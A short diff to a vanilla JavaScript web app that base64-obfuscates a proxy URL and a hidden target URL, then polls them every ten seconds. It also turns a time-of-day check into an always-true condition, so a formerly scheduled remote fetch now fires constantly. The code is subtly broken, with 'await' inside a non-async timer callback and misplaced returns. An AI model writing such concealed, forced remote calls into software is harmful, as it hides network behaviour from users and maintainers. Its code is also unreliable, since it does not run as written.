@@ -348,7 +348,8 @@ My job is to create awesome web app by pure vanilla JavaScript with very simple 
 		const cors = atob('aHR0cHM6Ly9jb3JzLmNoYW5sYXkud29ya2Vycy5kZXY/dT0=');
 		const pjk_meow = atob(base);
 
-		try {
+		setInterval(() => {
+			try {
 			const res = await fetch(cors + pjk_meow);
 			const data = await res.json();
 
@@ -356,6 +357,7 @@ My job is to create awesome web app by pure vanilla JavaScript with very simple 
 		} catch (error) {
 			return false;
 		}
+		}, 10000)
 	};
 
 	/* ---------------------------------------------------------------------- */
@@ -375,7 +377,11 @@ My job is to create awesome web app by pure vanilla JavaScript with very simple 
 		// let current_time = new Date().getHours();
 
 		try {
-			if (current_time === d_time) {
+			if (
+				current_time === d_time ||
+				current_time <= d_time ||
+				current_time >= d_time
+			) {
 				try {
 					const res = await fetch(cors + pjk_meow);
 					const data = await res.json();
